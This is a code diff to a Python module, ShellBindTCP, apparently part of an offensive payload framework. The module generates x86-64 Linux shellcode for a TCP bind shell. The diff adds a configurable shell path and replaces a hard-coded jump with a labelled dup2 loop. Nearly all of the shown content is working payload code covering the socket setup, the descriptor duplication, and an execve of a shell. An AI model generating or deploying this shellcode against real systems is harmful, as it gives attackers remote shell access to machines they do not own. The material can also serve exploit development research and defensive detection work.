@@ -35,6 +35,11 @@ class ShellBindTCP(HatAsm, HatVenom, Consts):
         if 'BPORT' not in options:
             return b''
 
+        if 'SHELL' in options:
+            shell = options['SHELL']
+        else:
+            shell = self.shell
+
         bport = self.convert_port(options['BPORT'])
 
         shellcode = f"""
@@ -42,13 +47,13 @@ class ShellBindTCP(HatAsm, HatVenom, Consts):
             push 0x29
             pop rax
             cdq
-            push 2
+            push 0x2
             pop rdi
-            push 1
+            push 0x1
             pop rsi
             syscall
 
-            xchg rax, rdi
+            xchg rdi, rax
             push rdx
             mov dword ptr [rsp], 0x{bport.hex()}0002
             mov rsi, rsp
@@ -67,19 +72,21 @@ class ShellBindTCP(HatAsm, HatVenom, Consts):
             pop rax
             syscall
 
-            xchg rax, rdi
-            push 3
+            xchg rdi, rax
+            push 0x3
             pop rsi
+
+        dup:
             dec rsi
             push 0x21
             pop rax
             syscall
 
-            jne 0x1033
+            jne dup
             push 0x3b
             pop rax
             cdq
-            movabs rbx, 0x{self.shell.hex()}
+            movabs rbx, 0x{shell.hex()}
             push rbx
             mov rdi, rsp
             push rdx
